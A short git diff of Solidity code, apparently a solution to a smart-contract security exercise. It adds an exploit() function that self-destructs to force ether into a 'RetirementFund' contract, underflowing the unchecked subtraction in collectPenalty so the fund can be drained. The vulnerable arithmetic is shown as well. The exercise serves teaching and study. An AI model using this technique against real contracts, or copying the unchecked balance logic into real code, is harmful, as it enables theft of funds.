@@ -34,7 +34,7 @@ contract RetirementFund {
     }
 
     function collectPenalty() public {
-        require(msg.sender == beneficiary);
+        require(msg.sender == beneficiary, "not beneficiary");
         uint256 withdrawn = 0;
         unchecked {
             withdrawn += startBalance - address(this).balance;
@@ -58,4 +58,13 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+     function exploit() public payable {
+        // call() don't work since retirementFund don't have receive()
+        // (bool ok, ) = payable(address(retirementFund)).call{value: 1 ether}("");
+        // require(ok);
+
+        // selfdestruct with send the 1 ether from this contract to retirementFund
+        // which will then underflow the withdrawn in collectPenalty
+        selfdestruct(payable(address(retirementFund)));
+     }
 }
